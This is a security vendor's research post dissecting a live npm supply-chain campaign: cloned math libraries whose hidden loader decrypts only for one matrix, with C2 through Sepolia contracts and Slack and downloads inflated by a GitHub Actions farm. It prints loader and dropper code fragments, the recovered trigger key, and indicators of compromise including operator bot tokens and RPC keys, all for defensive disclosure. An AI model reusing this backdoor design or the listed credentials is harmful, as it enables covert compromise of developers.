---

excerpt: "JFrog Security Research uncovered a targeted npm campaign hidden in cloned math libraries. The backdoor activates only for a specific matrix, receives encrypted tasks through an Ethereum Sepolia smart contract and Slack, and uses a GitHub Actions worker farm to manufacture hundreds of thousands of downloads."
title: "Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign"
date: "September 21, 2026"
description: "JFrog Security Research Team"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/equation-of-compromise/image1.png
type: realTimePost
minutes: '10'

---



![](/img/RealTimePostImage/post/equation-of-compromise/image1.png)

Over the past week, several vendors have reported on malicious npm packages that, taken one at a time, look like separate incidents. In this article, we present our research into the campaign behind all of them, starting with analysis of the latest encrypted loader detected by [SafeDep](https://safedep.io/mathmain-encrypted-loader/). Unlike most malware, this one doesn't run for everybody who installs it, and requires a very specific cryptographic operation to be performed, allowing us to assume it's a targeted operation, maybe an interview campaign. The payload decrypts only when the victim solves a linear system with one specific matrix, takes its orders from a smart contract on the Ethereum Sepolia testnet, keeps a second command channel open over Slack, and hides behind download counts manufactured by a farm of GitHub Actions workers.

The teardown below covers recovering the trigger key, what the implant does once it runs, how the contract enrolls and tasks victims, the Slack agent, the download factory, and the entire campaign operating accounts behind it for the six months.

**It started with a math library**

mathsbase is a straight copy of the popular [mathjs](https://www.npmjs.com/package/mathjs) library: same code, same README, different name. What was off was the popularity of six million downloads two days after publication, and not a single package depending on it**.**

![](/img/RealTimePostImage/post/equation-of-compromise/image2.png)

api.npmjs.org · 4 weeks, 24 Aug – 20 Sep 2026

The 1.0.1 tarball carries four files that do not exist anywhere in upstream mathjs:

| File under lib/cjs/utils/ | Size | What it is |
| :---- | :---- | :---- |
| event.js | small | AES-256-GCM loader |
| graph.js | 31 KB | base64 blob |
| fraction.js | 12 KB | base64 blob |
| bignumber/type.js | 1.5 MB | base64 blob |

Three encrypted blobs and a loader, but no key. So we pulled it apart.

## **Breaking it open**

The loader in utils/event.js is simple: it takes a password, derives a key from it with a functionscrypt that turns a password of any length into a fixed 32-byte key,  then decrypts the payload from graph.js with AES-256-GCM, writes the plaintext to disk, and executes it with require.

Each encrypted file is laid out as salt[16] | iv[12] | tag[16] | ciphertext: a 16-byte salt, a 12-byte IV, a 16-byte authentication tag, then the encrypted payload. All four sit in the file in the clear and are required as input for the AES-256-GCP decrypt routine. 

What the file does not contain is the one input that has to be secret: the password the key is derived from. Salt, IV, and tag are the public parameters of the encryption; the password is the only thing the attacker did not ship. The only question is what feeds it.

The loader function is called from the file utils/is.js, from a function that has no counterpart in upstream mathjs:

```js
function isGraph(x) {
  const name = _event.validEvent("IapMCmvlemBnFaU+...", JSON.stringify(x));
  const mod  = require(_event.event(path.join(__dirname, name), JSON.stringify(x)));
  return x && mod.validGraph(JSON.stringify(x)) || false;
  
}
```

isGraph() is reached from lusolve(), the function that solves a system of linear equations, through two modified files. When a developer calls the exported math.lusolve(A, b), lusolve factors the matrix with math.lup(A), gets back L, U, p and q, and calls the internal _lusolve(), which solves the system and produces the answer exactly as upstream does. Only after that result exists does an injected line in lusolve.js call removeSolveValidation(L._data), a function added to solveValidation.js that does not exist upstream. Inside it, a second injected line calls isGraph() on the same array, which serializes it to a JSON string and hands that string to the loader as the password. **That array is the key.**

The placement is deliberate. The hook runs after the mathematical work is finished, and the return value of removeSolveValidation is assigned to a variable that is never read again, so the malicious call cannot change the output. The developer's answer is always correct.

```js
password  = JSON.stringify(L._data)
key       = scryptSync(password, salt, 32)
plaintext = AES-256-GCM(key, iv, tag, ciphertext)
```

No key ships with the package. The victim's own numerical workload supplies it at runtime, in a line as unremarkable as const weights = math.lusolve(A, b). Any other matrix fails GCM authentication, the loader swallows the exception, and require() chokes on base64 inside a code path where errors are already routine.  The malware is filtering for the only people it wants: developers who call lusolve as a matter of course. Judging by that trigger and by the DeFi-flavoured lure packages, the intended audience is quantitative and DeFi developers, though we never recovered a payload to confirm it.

So we had to guess the matrix. The search space is arbitrary arrays of doubles, but AES-GCM gives a free oracle: the authentication tag either verifies or it does not, with no false positives, at about 50 ms per candidate. We enumerated structured matrices (identities, small integer matrices, textbook examples) and let the tag decide. It was the **3×3 symmetric Pascal matrix**:

```js
A = [[1,1,1],[1,2,3],[1,3,6]]
math.lup(A).L._data → [[1,0,0],[1,1,0],[1,0.5,1]]
```

That string decrypts the first blob to a filename, graph.js, and from there the whole package opened up.

## **What was inside**

graph.js is the orchestrator. It turns a one-off decryption into a persistent implant in four steps.

**It uses the LICENSE file as a lock.** Before anything else, it reads the package's own LICENSE file and looks for a line that has no business being in a licence:

```js
if (license.includes("REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.")) {
    process.exit(1);   // already infected — stop here
// }
// fs.appendFileSync(licensePath, "\nREDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE.");
```

It is an infection marker hidden in the one file nobody reads. Deleting the line is also how the malware later uninstalls itself.

**Then it detaches.** It respawns itself as a background process (detached: true, stdio: "ignore", unref()), so the developer's script finishes and the implant keeps running.

**After that it phones home.** It collects platform, hostname, CPU count, memory and uptime, formats them as a Markdown block titled *🖥️ System Report*, and posts it to a Slack channel and a Telegram chat. Both credentials sit in the file as plain base64. This is the only outbound traffic graph.js ever sends, and nothing ever comes back on either channel.

**And finally, it gets an identity on the Ethereum blockchain.** The operator wants to send instructions to one infected machine that nobody else can read, and wants no server that can be seized. For that, they're using a smart contract on the Sepolia testnet. Reading a contract is free and anonymous; writing to one needs a funded wallet. So the implant generates an X25519 keypair, then fetches a wallet the operator set aside for it. The wallet's private key sits encrypted in the contract, and unwrapping it takes two secrets joined with a *: the trigger password, and the version string of the assert devDependency in the victim's own package.json.

```js
const walletPassword = triggerPassword + "*" + getNPwd();   // getNPwd() = pkg.devDependencies?.assert
// const address    = await contractRead.getLastActiveCwAddress();
// const encrypted  = await contractRead.getCwPrivatePublic(address);
// const privateKey = await decryptAESGCM(encrypted, walletPassword);
```

bootstrapWallet then checks that the decrypted value looks like a private key and that the address it derives matches the one the contract named. Neither secret works alone, so the wallet only opens on a machine that installed the package and ran the trigger. A researcher holding the tarball cannot obtain a working identity.

With a wallet in hand, the implant writes its public key into the contract as a check-in. The operator reads it, derives a shared secret, and from then on every task is encrypted for that one machine.

The other two blobs are supporting cast. **bignumber/type.js**, the 1.5 MB one, is a bundled copy of **ethers.js v5.7.2**, shipped so the implant has a Web3 client without touching node_modules. **fraction.js** is the Slack agent, covered below. 

## **Command and control on a testnet**

The implant's primary command channel is not a server. It is a smart contract on the **Sepolia test network**, used as a dead drop. A C2 server has an IP address, a hosting provider, and an abuse desk; a contract has none of those, cannot be taken down once deployed, and on a testnet costs nothing to use. The implant reads it through ordinary public RPC endpoints, so the traffic looks like a developer's own Web3 work.

### **Enrollment**

The contract runs a small membership system. The operator adds the victim's wallet address to an allowlist and stores an encrypted private key for it on-chain; the implant unwraps that key as described above and only then announces itself by writing its public key into the contract. The compiler left the failure messages in the bytecode:

```js
"Not whitelisted"
"No active whitelisted address"
"Caller is not the owner"
```

That discipline has an accidental consequence: **the operators kept a public register of their own victims.** 

The campaign ran on fourteen smart contracts, deployed by five operator wallets between 2026-03-05 and 2026-09-16: thirteen on Ethereum Sepolia and one on Base Sepolia. Eight contracts were actively used and had enrolled victims, the other six took no more than two hosts each and served as rehearsals. All fourteen are verified on-chain under one of three names, `WalletDataRegistry`, `WebDataRegistry` and `WalletHelloWorld`, and searching the explorer for those names returns every deployment regardless of who made it. The verified source reads as a single codebase developed over six months with one compiler, solc 0.8.20. Every deployment was edited and recompiled, leaving thirteen distinct source variants across fourteen contracts. The contracts were not replaced one at a time: in June, three of them ran in parallel under three different wallets, and packages published months apart point at the same deployment.

![](/img/RealTimePostImage/post/equation-of-compromise/image3.png)

eth-sepolia.blockscout.com · all 1,060 successful transactions to the contract, 18 Jun – 14 Sep 2026

### **Tasking**

The operator writes a payload into two storage slots on the contract (split purely for size); writing the second slot emits an event; the implant has been subscribed to that event since it started. It reads both halves, decrypts them with its own private key and joins them, then writes the result to t utils/subwatcher, marks it executable, and runs it. 

![](/img/RealTimePostImage/post/equation-of-compromise/image4.png)

payload downloading

The fourteen contracts carried 1,080 taskings, preserved as 2,162 encrypted payloads. Each is sealed under a key shared by the operator and a single implant, and none can be decrypted.

Payloads were built once and sent to many hosts. The first production contract delivered a single 14.5 KB payload 64 times in five days. A payload of about 19.6 KB appears on three contracts between March and August, roughly 250 times in all — consistent with one second stage kept in service for five months.

On deployment day of the June contract, 21 test payloads growing from 2.7 KB to 18 KB, alongside 23 out-of-gas failures, mark the operator probing the transaction size limit. Full 20–28 KB second stages followed until August. From 31 August the contract carried only a uniform 919-byte payload.

**We cannot read any of them.** The payloads are encrypted with asymmetric cryptography, under a key that only two parties can derive. The operator derives it from their own private key and the implant's public key, read from the contract. The implant derives the same key from the operator's public key and its own private key, which is generated at infection time and lives only in the memory of the victim process, never on disk or on the chain. Every blob also uses a unique salt and IV, so there is no nonce reuse to attack. We recovered the entire delivery mechanism and none of the cargo. What the implant was ultimately told to do is the one question this investigation cannot answer.

One curiosity: the contract also contains a complete on-chain file-storage system (chunked upload, metadata, file count). In five months, **not one of those functions was ever called.**

## **A second channel over Slack**

The third blob, fraction.js, is a Slack agent. graph.js decrypts it and launches it as its own detached process on every infection, several steps before the wallet that the contract path requires:

```js
spawn(process.execPath, [slackAgent, slackSecret, String(process.pid), password], {
    cwd: __dirname, detached: true, stdio: "ignore", windowsHide: true
  
});
```

It is a separate channel with separate keys. The reporting bot in graph.js only writes; this one only reads, from a different channel, with a different bot. Its credentials are not in the file in readable form: the bot token and channel ID are AES-GCM encrypted under the trigger password, and the messages themselves are encrypted under a Diffie-Hellman secret computed against a server public key hardcoded in the malware. That is not the secret used for blockchain tasking, which is computed against a key fetched from the contract, so the two channels fail independently: cracking one gives you nothing on the other.

```js
reporting  (graph.js, plain base64, write-only)
  bot      xoxb-11307403103236-{truncated}
  channel  C0B8XPGCKQS

tasking    (fraction.js, AES-GCM encrypted, read-only)
  bot      xoxb-11301867762550-{truncated}
  channel  C0B8GEPFMK9
  operator U0B91JWCVT6
```

The agent polls conversations. history every ten seconds. On startup, it records the timestamp of the latest message and only looks at messages posted after it arrived, so a new victim never replays the operator's back catalogue. It only acts on messages from one hardcoded user ID, so holding the token is not the same as being able to task implants.  
**The payload arrives as text.** Nothing is downloaded: the agent reads the text and ts fields of a message and nothing else, and slack.com is the only hostname in the module. Each message body decrypts to a JSON packet in a small transfer protocol:

| Packet | Fields | Effect |
| :---- | :---- | :---- |
| {t:"s"} | id, name, total | begin a transfer |
| {t:"c"} | id, n, d | deliver chunk n |
| {t:"e"} | id | reassemble and run |

```js
fs.writeFileSync(savePath, assembled, "utf8");   // ...utils/subwatcher
// fs.chmodSync(savePath, "755");
// runProcess(savePath);
```

Slack caps message length, so an executable is split across many messages and rebuilt on the victim. There is no practical ceiling on size. A body containing exitexitexit is treated as an order instead: the agent deletes the infection marker, kills its parent, and exits.

## **The one we could not open**

matrixflow-js@3.2.1 is an ml-matrix reskin with the same loader chain, hooked at the top of the exported solve(). It differs in one way that matters: where mathsbase keys on a value derived from the input (the LU factor), matrixflow-js keys on the caller's raw matrix, compared by SHA-256 against a constant. A key equal to the caller's own input will essentially never match by accident, so this trigger is not waiting for ordinary work: **the input has to be supplied by the operator**, as a demo script or a task handed to a contractor. We could not find it, and its payload is still sealed. Version 3.2.2, published a week later, quietly removed the loader.

## **Following the accounts**

The operators are disciplined about identity: one npm account per package, emails alternating between @proton.me and @outlook.com, accounts abandoned the moment a package is removed. Across every GitHub identity in the cluster, there are **zero followers and zero following**, and not one campaign repository has a stargazer. We mapped the cluster anyway, through the seams where that discipline failed.

**A handle reused across providers.** The npm account weed0 publishes from tinystar368@gmail.com; tinystar8, which published the backdoored mathsbase, uses tinystar368@proton.me. That single collision joined the DeFi persona packages to the malware cluster, and commit metadata confirmed it: the GitHub identity UmajiHidekata, which hosts the inflation tool and commits to its target list, signs as tinystar368@gmail.com. The tool itself was written by a fourth identity, andrewstory18, whose commit opens the repository's history.

**Repositories, where they exist at all.** Only two of the five malicious packages have a public GitHub repository behind them — tinystar8/mathsbase and mathubio/math-universe. allendev12 was deleted along with its account, and linnianping and robert92 never published one. Where a repository does exist it is a clone of the real project with its upstream history left intact: tinystar8/mathsbase carries all 5,694 mathjs commits, 3,674 of them still signed by mathjs's own author, with 136 mechanical rename commits by Blustdp layered on top. The effect is a repository that looks like a long-maintained library at a glance, and the rename commits are the only trace of the operators in it.

That is also the limit of what the repositories tell us. **None of the malicious code was ever committed to GitHub.** We searched the full history of every repository in the cluster for the loader's primitives — scryptSync, aes-256-gcm, the beacon IP — and found nothing. The payload is injected at publish time and exists only in the npm tarball, which is why the repositories look clean to anyone who checks them instead of the package.

## **The download factories**

Millions of downloads in two days after release is not organic. Studying the repositories behind the accounts above uncovered the mechanism: a download farm in three public GitHub accounts, repositories worker1 through worker10, running on GitHub's own infrastructure.

| Operator | Repositories | First commit | Commits |
| :---- | :---- | :---- | :---- |
| andrewstory18 | worker1–10 | 2026-07-13 | ~4,800 |
| davidbabcock96 | job_worker1–10 | **2026-06-25** | 5,317 |
| azlanrahman322-creator | job-worker1–10 | 2026-07-01 | 5,225 |

All of repositories ship an identical WASM decoder (md5 91e020c13cb97a6365135b53b0d0fe5f), every commit carries the message "Update commands from job_master"**,** and the two newer farms receive byte-identical commands.json pushes down to the individual download counts. That is one orchestrator fanning a single configuration out to multiple operators. job_master itself is not public, but its output is.

![](/img/RealTimePostImage/post/equation-of-compromise/image5.png)

	downloads farm activity

Each repository holds the same four files:

```js
commands.json                       ← AES-encrypted package names + counts
index.js                            ← minified driver
pkg/worker_wasm_bg.wasm             ← Rust decoder, 122 KB
.github/workflows/run-worker.yml    ← runs index.js on every push
```

The driver decrypts a package name, resolves its tarball URL and downloads it count times at one-second intervals — then throws the bytes away. It only needs the request to complete so npm's telemetry records a download.

The target list is encrypted so the repository never names its own victims:


```json
[
  { "name": "JcrvKzoIHPVLKIOa4bS7SYwlHtYmQU2rFZhsCjVhU+Lxhc1DL4h+ZT9KXJuoIVHmIBwG", "count": 6882 },
  { "name": "uIznVb+PhIo5qQ6z1dP587rkA9iHoJNZ07FlIruyN+FcqHTZi52L9BppZaPpTt/pWw4=", "count": 2261 }
]
```

The encryption is not much of an obstacle: the AES-256-GCM key is compiled into the WASM in plain ASCII as npm_workvr_protect_key_v1. They encrypted the target list so the public repository would not name its own victims, then shipped the key in the same repository.  
build_metadata_url is a pure string-to-string function. That recovered unique target packages and the full scheduling history. 

| Package | Scheduled downloads |
| :---- | :---- |
| events-sync | 40,715,826 |
| events-channel | 38,217,963 |
| indexed-btree | 37,969,615 |
| quick-events | 37,896,325 |
| btree-core | 37,657,103 |
| amm-strategy-backtester | 19,060,693 |
| @oliviamcdaniel12/safer-buffer | 17,957,387 |
| matrixflow-js | 14,767,050 |
| matrixhub | 11,697,230 |
| matrix-ops-core | 10,890,210 |

## **What we could not answer**

* **What the implant was told to do.** Fifteen tasks payloads, all sealed under an ephemeral X25519 secret. The targeting of quantitative and DeFi developers is inferred from the lures and the lusolve trigger, not from a recovered payload.  
* **matrixflow-js@3.2.1.** It keys on the caller's raw matrix, so there is no reduced search space; the value is almost certainly supplied by the operator alongside the lure.  
* **The pre-July inflation mechanism.** At least one package with 2.56M downloads was inflated by something that is not the worker farm.

## **For defenders**

* If you consume any mathjs-shaped package, check for two files that **do not exist in upstream mathjs**: lib/cjs/utils/event.js and lib/cjs/utils/graph.js. Their presence is conclusive and, unlike a hash, survives repacking.  
* A subwatcher file at mode 755 under lib/cjs/utils/ means the payload has already executed. A package LICENSE ending in REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE. means the host is actively infected.  
* On the registry side, the durable signal is **over a million downloads with zero dependent packages and zero dependent repositories**. It held for every vehicle here. Note that npm's dependencies:<pkg> search qualifier is not supported and silently degrades to fuzzy matching; use ecosyste.ms or libraries.io for reverse-dependency data.  
* Behaviourally: any package exposing the mathjs API whose lusolve/lup path reaches crypto, path, child_process or https; a fixed ten-second poll to slack.com/api/conversations.history with no jitter; and outbound JSON-RPC to Sepolia from a developer workstation or build agent.  
* Rotate anything a compromised workstation could reach, and treat the clean-but-inflated packages listed below as pending rather than safe: the operators publish clean and weaponise roughly a day later.

## **Summary**

What we are watching is a sophisticated operation that has been running for months and is still evolving. Its lures are aimed at developers doing quantitative and DeFi work, and every layer of it changes on its own schedule: the trigger design differs from package to package, the command channel has two independent paths, and the packages, publisher accounts and GitHub organisations behind them are disposable, created in minutes and abandoned the moment a package is removed. A download farm gives each new package the look of an established library before it is weaponised, and it is still running as we write. JFrog customers using Xray and Curation can detect and block these malicious packages, and JFrog Catalog users can view the updated campaign package list with the "Equation of Compromise" label.

Our investigation is continuing. There are payloads we have not decrypted, and an orchestrator we have not found, and the operators are still publishing. We will update this article as we learn more.

## **Indicators of compromise**

### **Malicious packages, live at time of writing**

| package | version | date |  |
| :---- | :---- | ----- | ----- |
| modern-events | 1.3.3, 1.3.4, 1.4.0, 1.4.1, 1.4.2, 1.4.3, 1.4.4, 1.5.0, 1.5.1, 1.5.2 | 2026-03-03 | XRAY-968383  |
| quick-events | 2.1.3 | 2026-04-23 | XRAY-990105 |
| @ignacionunez91/keccak24 | 1.0.7 | 2026-05-05 | XRAY-1005328   |
| crypto-hasher | 3.1.2, 3.1.3 | 2026-05-06 | XRAY-1027597 |
| events-router | 2.1.4 | 2026-05-22 | XRAY-990103   |
| events-runtime | 3.1.3, 3.2.0, 3.2.1, 3.2.3, 3.2.4, 3.3.0 | 2026-06-08 | XRAY-1002132   |
| sort-btree | 2.1.6, 2.2.0 | 2026-06-14 | XRAY-1007137   |
| ordered-btree | 3.2.2 | 2026-06-18 | XRAY-1007133   |
| indexed-btree | 2.1.2 | 2026-06-18 | XRAY-1089213   |
| @andrewstory18/is-real-odd | 2.0.3 | 2026-06-30 | XRAY-1036540   |
| @oliviamcdaniel12/safer-buffer | 2.2.0, 2.2.1 | 2026-07-10 | XRAY-1026861   |
| mutex-forge | 2.0.0, 2.0.1, 2.0.2 | 2026-08-11 | XRAY-1051670   |
| mutex-thread | 1.3.0 | 2026-08-14 | XRAY-1057196   |
| mutex-core | 2.1.2 | 2026-08-17 | XRAY-1057451   |
| matrixflow-js | 3.2.1 | 2026-08-18 | XRAY-1057446   |
| mutex-plus | 3.0.2 | 2026-08-18 | XRAY-1057459   |
| mutex-lite | 1.4.2 | 2026-08-18 | XRAY-1057455   |
| matrixkit-js | 1.0.0 | 2026-08-24 | XRAY-1074505   |
| mathsbase | 1.0.1 | 2026-08-27 | XRAY-1088056   |
| math-universe | 1.0.0, 1.0.1, 1.0.2 | 2026-09-16 | XRAY-1088055   |
| mathmain | 1.0.0 | 2026-09-17 | XRAY-1088058   |
| graphcore-js | 2.3.2, 2.3.4, 2.4.1, 2.4.2 | 2026-03-17 | XRAY-962933 |
| graphlib-js | 1.2.0, 1.2.1, 1.2.2, 1.3.2, 1.3.3, 1.3.4 | 2026-03-17 | XRAY-952425  |
| events-channel | 2.3.1, 2.3.2, 2.4.1 | 2026-05-21 | TBA |

### **PuP packages, inflated**

| secure-library-loader | 0.1.0 – 0.1.3 | 2026-08-25 |
| :---- | :---- | :---- |
| matrixhub | 6.15.0, 6.15.1 | 2026-08-25 |
| matrix-ops-core | 1.0.0-1.0.4 | 2026-08-31 |

### **C2 contracts**

Ethereum Sepolia  
  0x906f019AC38bB572a8f7d8b2cA662D624EDebaff   2026-03-05  WalletDataRegistry  
  0x2707BbD5CF9b2F7cE37e4913BADC0349272d48cf   2026-03-06  WalletDataRegistry  
  0x2a8536AdA44816Cb049778d24b75d795987D90b1   2026-03-06  WalletDataRegistry  
  0x4C0c9B92BB9647fAf45022BA55f02bB0950196de   2026-03-06  WalletDataRegistry  
  0xDe34270921D37124fd0b64ea3aE4c5062B467418   2026-03-10  WalletDataRegistry  
  0x315d47b401aC29e97893dec1c85aBBB2791ef2aA   2026-03-10  WalletDataRegistry  
  0x475B8659A33FB0C2bDB4c60ffdb92bC24d5c4015   2026-03-18  WalletDataRegistry  
  0xd5A4620278788AcCf388B7Ea5f35f849465728E7   2026-03-18  WalletDataRegistry  
  0x4b225b742eb31AD0DfD6bc00F8C55650b4394c18   2026-03-18  WalletDataRegistry  
  0x661e50E19f05E3c0d04fD75891456D1F0A24508D   2026-04-16  WalletDataRegistry  
  0xc0445F1b679DC46280A0f03F451bdf613b5A0feA   2026-06-08  WebDataRegistry  
  0x9E4dF8F253Eb439dd9538Fda30cC03B38fD3a631   2026-06-15  WebDataRegistry  
  0xE390863Dac96a7118C71227C2b099B50cF602D31   2026-06-18  WalletHelloWorld  
Base Sepolia  
  0xac0bfC4C48A679b667732128278EACBA1c191894   2026-08-28  WalletHelloWorld

source-level identifiers    PROTOCOL = "HUBMSBAT"   PROTOCOL = "HEIGUNSE"

### **Network** 

**Slack:**  
workspace A   tasking C0ATC9UKKA4   reporting C0B554AQF1S   operator U0B51HGMGJW / B0B5VRXPHKJ  
              xoxb-10914929427361-1091493…  
              xoxb-10751214461892-1089634…

workspace B   tasking C0B8GEPFMK9   reporting C0B8XPGCKQS   operator U0B91JWCVT6 / B0B8Y0V8NUA  
              xoxb-11301867762550-11301869433…   
              xoxb-11307403103236-112897671279….  
              xoxb-11307403103236-11289767127…   (rotated)

**Telegram:**  
8717417715:AAGZ-24bqk9QAUh  chat -1003968723972  
8961878831:AAG4WTbRUcbXI5U   chat -1003952553968, -1004489630130  
8836581068:AAF1e0v1nbMEShE   operator monitoring tool, alerts to @server_alert_0630

### **RPC provider projects**

pair A   eth-sepolia.g.alchemy.com/v2/0E6xblLeXLnZSnn280R-O  
         sepolia.infura.io/v3/d3d6e819028346a0b973bd5dd371c468  
pair B   eth-sepolia.g.alchemy.com/v2/D2-TbkB2m05WXSnSDOCDI  
         sepolia.infura.io/v3/dc7257d09fab42eca2c354c32fec1938  
pair C   eth-sepolia.g.alchemy.com/v2/NObVGNvMv3xNnlHDx3QYc

### **Files**

lib/cjs/utils/event.js              loader  
lib/cjs/utils/graph.js              stage 2, base64  
lib/cjs/utils/fraction.js           stage 3, base64  
lib/cjs/utils/bignumber/type.js     bundled ethers, ~1.5 MB  
lib/cjs/utils/subwatcher            dropped payload, mode 755  
LICENSE ending "REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE."  
Trigger blob: IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==

### **Inflation infrastructure**

github.com/andrewstory18/worker1              … worker10  
github.com/davidbabcock96/job_worker1         … job_worker10  
github.com/azlanrahman322-creator/job-worker1 … job-worker10  
github.com/UmajiHidekata/jobworker

WASM md5  91e020c13cb97a6365135b53b0d0fe5f   identical across all 30  
WASM key  npm_workvr_protect_key_v1          AES-256-GCM, hardcoded

### **Accounts**

| npm account | Email | GitHub |
| :---- | :---- | :---- |
| tinystar8 | tinystar368@proton.me | tinystar8 |
| elenahorn97 | elenahorn97@proton.me | mathubio |
| allendev12 | allennightgale0812@outlook.com | allendev12 *(deleted)* |
| linnianping | lin.n.ping@proton.me | MATRIXFLOW-JS |
| robert92 | robertjohnson8601@… | — |
| hunterhicks18 | hunterhicks18@proton.me | MatrixHub-Org |
| jamesmorse82 | jamesmorse82@proton.me | Ops-Core |
| monawillis412 | mona.willis@outlook.com | GRAPHCORE-JS |
| andrewstory18 | andrew.story18@outlook.com | andrewstory18 |
| davidbabcock96 | david.babcock96@outlook.com | davidbabcock96 |
| — | azlanrahman322@gmail.com | azlanrahman322-creator |
| — | mattpalmer0602@gmail.com | MattPalmer0602 |
| weed0 | tinystar368@gmail.com | UmajiHidekata |
| justin454 | justin.campos454@outlook.com | Blustdp |
| gerrysmith2026 | gerry.smith2026@outlook.com | gerrysmith2026 |
| wesleymoses97 | wesley.moses97@outlook.com | EVENTSKIT |
| josephjordan93 | joseph.jordan93@outlook.com | josephjorden93 |
| lesstafford24 | lesstafford24@outlook.com | EVENTS-ROUTER |
| angelinaparrish18 | angelinaparrish18@outlook.com | EVENTS-RUNTIME |
| — | bradley.steven93@outlook.com | — |
| — | ignacionunez91@outlook.com | — |
| moniquemeza22 | moniquemeza22@outlook.com | GRAPHKITORG |
| ignacionunez91 | ignacionunez91@outlook.com | SORT-BTREE, KECCAK24 |

**GitHub organisations:** QUICK-EVENTS · EVENTSKIT · POWEREVENTS · EVENTS-ROUTER · EVENTS-RUNTIME · EVENTS-CHANNEL · EVENTS-SYNC · EVENTS-SYNCE · MODERN-EVENTS · GRAPHCORE-JS · GRAPHLIB-JS · GRAPHKITORG · CRYPTO-HASHER · KECCAK24 · INDEXED-BTREE · BTREE-CORE · SORT-BTREE · ORDERED-BTREE · MUTEX-CORE · MUTEXTHREAD · MATRIXFLOW-JS · MatrixHub-Org · Ops-Core · 